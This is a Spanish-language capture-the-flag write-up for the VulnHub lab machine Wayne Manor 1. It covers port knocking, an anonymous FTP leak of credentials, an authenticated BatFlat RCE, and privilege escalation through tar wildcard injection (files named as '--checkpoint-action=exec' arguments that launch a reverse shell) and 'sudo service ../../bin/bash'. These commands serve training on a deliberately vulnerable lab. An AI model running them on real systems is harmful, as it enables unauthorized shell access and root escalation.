# Wayne Manor 1

Tags: [[_infoLeakage]],[[_cms]],[[_webExploitation]],[[_analysis]],[[_timeTasks]],[[_scripting]],[[_sudoersAbusing]]

## Primeros pasos
(Reconocimiento).

Primero le acomodamos bien para que agarre una IP (poner modo Bridged).

Organizamos TMUX.
Hacemos un escaneo en la red para determinar la IP de la máquina.
Mediante el OUI reconocemos la máquina que vamos a atacar.

Le hacemos un ping a la máquina. (Está activa o no).
Posible máquina Linux.
Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.

Empezamos el escaneo con NMAP.

Buscamos codename con launchpad, un posible Ubuntu (Focal || Hirsute).

Puertos abiertos.
<span style="color:#ff669c">22</span>.Versión 8.2

<span style="color:#ff669c">80</span>.nginx/1.18.0

## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff669c">22</span>.
De momento no poseo credenciales válidas.

<span style="color:#ff669c">80</span>.
Whatweb no reporta mucho.
El título de Bienvenido a Nginx es hecho de forma manual.
Hay dos links, uno nos lleva a una web de Nginx, la otra también pero es HTTP lo cual es raro, la original es HTTPS.

<span style="color:#88c425">nmap --script=http-enum 192.168.0.13 -p80</span> :    solo muestra el robots.txt
El cual solo muestra un dibujo de murciélago.

NOTA. Nos dicen el el propio vulnhub, que hay que añadir "waynemanor.com" en el /etc/hosts, parece que no figura en un diccionario.

Whatweb me reporta más cosas para ese dominio, parece se un BatFlat.
Fuzzear con nmap me muestra mucho, hay panel de autenticación en /admin.
/uploads/ no me carga nada.

FUZZEAR potente ambas webs. Pero antes.

Hay que analizar la web.
Hay usuarios potenciales.
bruce wayne
alfred

manor
door
knock
party
batman

Hay un apartado de mandar mensaje.

Hay un apartado que dice "Finish The Party" con las iniciales marcadas, dando a entender "FTP". Pero no está abierto.
También habla de que si entran muchas personas, se abre una puerta secreta.
<span style="color:#ecacb6">300, 350, 400 people</span>

Así que todo eso junto, me haría pensar en [[Port Knocking]].
Solo vemos 2 puertos abiertos, pues con knock podemos configurar Port Knocking para que al golpear ciertos puertos se abra de forma temporal un puerto para mi, para verlo.
<span style="color:#bef202">Procedimiento.</span>

<span style="color:#88c425">knock 192.168.0.13 300 350 400</span> :    para golpear esos puertos.

Y luego escanear de nuevo con NMAP.
<span style="color:#88c425">nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.13</span>

Ya podemos checar si podemos conectarnos de forma anónima al FTP.
<span style="color:#88c425">nmap --script=ftp-anon -p21 192.168.0.13</span> :    para no entrar de forma manual, ver si hay archivos para luego hacerle un get.

En este caso hay un info.txt
Con una credencial
bruce:alfred_help_me
Las cuales son válidas para el panel de autenticación que habíamos visto.

Enumerar BatFlat.
Version 1.3.6
Hay un campo de subida de archivos.
Podemos cambiar su contraseña.
Podemos descargar su foto de perfil.
Podemos agregar un usuario.

Son cosas normalitas.
Arriba en la URL hay un parámetro que tiene un valor pero como tal no hace mucho.

Busquemos vulnerabilidades en searchsploit.
Hay uno de RCE (Authenticated) para la versión 1.3.6 que es en la que estamos.

Lo ejecutamos con el nombre del dominio y los parámetros necesarios y pa deeentro.


## Escalada

Analizar todo.
Ubuntu Focal.

No vemos mucho, creamos un procmon.sh
<span style="color:#ecacb6">batman</span> usa tar para comprimir unos archivos de un directorio, pero los engloba todos.

Con tar yo me puedo spawnear una shell:
<span style="color:#88c425">tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</span> 

El script que ejecuta batman tiene el comando
<span style="color:#88c425">tar -zcf /tmp/web.tar.gz *</span>
Que vendría siendo
<span style="color:#88c425">tar -zcf /tmp/web.tar.gz batflat index.nginx-debian.html robots.txt</span>

Pues yo puedo crear otro dos archivos con nombres de los parámetros de tar
<span style="color:#88c425">tar -zcf /tmp/web.tar.gz batflat index.nginx-debian.html robots.txt --checkpoint=1 --checkpoint-action=exec=/bin/sh</span> 

Crear archivos:
<span style="color:#88c425">touch -- --checkpoint=1</span>
<span style="color:#88c425">touch -- --checkpoint-action=exec='sh reverse'</span>

Podemos hacer que nos haga 
<span style="color:#88c425">exec='sh reverse'</span>
Me creo el script <span style="color:#ecacb6">reverse</span> ahí mismo, una reverse shell.
Y pa deeentro.

Toca escalar a root.
<span style="color:#88c425">sudo -l </span>
Puedo ejecutar como root sin proporcionar contraseña, el comando service.
Pero si hago <span style="color:#88c425">sudo service ../../bin/bash</span>
Me pongo como root.

FIN.
